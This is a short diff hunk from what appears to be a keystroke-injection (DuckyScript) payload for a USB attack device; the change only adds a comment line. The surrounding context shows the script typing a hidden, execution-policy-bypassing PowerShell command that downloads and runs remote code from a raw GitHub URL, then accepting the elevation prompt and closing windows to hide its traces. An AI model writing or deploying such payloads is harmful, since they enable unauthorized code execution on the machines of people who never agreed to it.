@@ -20,6 +20,7 @@ STRING powershell -w h -NoP -Ep Bypass -C "irm https://raw.githubusercontent.com
 CTRL-SHIFT ENTER
 DELAY 500
 ALT y
+REM Script ends here - Remaining inputs close task manager after finishing script execution
 DELAY 300
 ALT TAB
 ALT F4
